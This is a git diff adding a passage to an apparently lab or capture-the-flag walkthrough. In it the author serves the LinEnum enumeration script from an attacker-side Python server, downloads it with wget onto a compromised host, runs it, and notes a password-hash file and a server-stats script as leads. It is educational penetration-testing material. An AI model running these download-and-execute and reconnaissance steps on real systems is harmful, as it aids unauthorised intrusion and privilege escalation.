@@ -117,8 +117,50 @@ And,finally the User FLag is retrieved.
 
 # Getting a Root Shell
 
+Lets transfer Local Linux Enumeration & Privilege Escalation Checks script to the compromised machine via Python server.
+The script can be found <a href="https://github.com/rebootuser/LinEnum">here.</a>
 
+* Run Python Server on the Local Machine containing the script (in the same path) via this command:
 
+```
+python3 -m http.server 80
+```
 
+<p align="center">
+  <img src="screenshots/7.png" width="738">
+</p>
+
+* On the target machine, type the following command to download the script:
+
+```
+wget http://10.10.14.6/linenum.sh
+```
+
+<p align="center">
+  <img src="screenshots/15.png" width="738">
+</p>
+
+* Run the exploit script with thorough-tests enabled:
+
+```
+chmod +x linenum.sh
+./linenum.sh -t
+```
+
+<p align="center">
+  <img src="screenshots/16.png" width="738">
+</p>
+
+* Once the scan finishes, it finds a potential password hash in the directory ```/var/nostromo/conf/.htpasswd``` which wasn't useful for further foothold.
+
+<p align="center">
+  <img src="screenshots/17.png" width="738">
+</p>
+
+* There is also a ```server-stats``` script in the directory ```/home/david/bin```
+
+<p align="center">
+  <img src="screenshots/18.png" width="738">
+</p>
 
 
